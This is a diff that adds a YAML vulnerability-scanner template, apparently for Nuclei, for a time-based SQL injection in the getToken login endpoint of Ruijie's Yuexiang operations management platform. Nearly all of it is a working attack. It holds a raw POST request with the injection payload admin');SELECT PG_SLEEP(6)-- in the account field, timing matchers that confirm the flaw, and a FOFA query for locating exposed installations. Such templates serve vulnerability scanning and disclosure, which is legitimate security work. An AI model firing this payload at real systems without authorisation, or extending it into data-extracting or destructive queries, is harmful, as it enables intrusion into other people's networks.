@@ -1,0 +1,28 @@
+id: ruijie-yuexiang-getToken-sqli
+info:
+  name: 锐捷乐享智能运维管理平台 getToken - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E4%B9%90%E4%BA%AB%E6%99%BA%E8%83%BD%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0getToken%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title="乐享智能运维管理平台"
+  tags: ruijie,yuexiang,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+        Host: {{Hostname}}
+
+        account=admin');SELECT PG_SLEEP(6)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
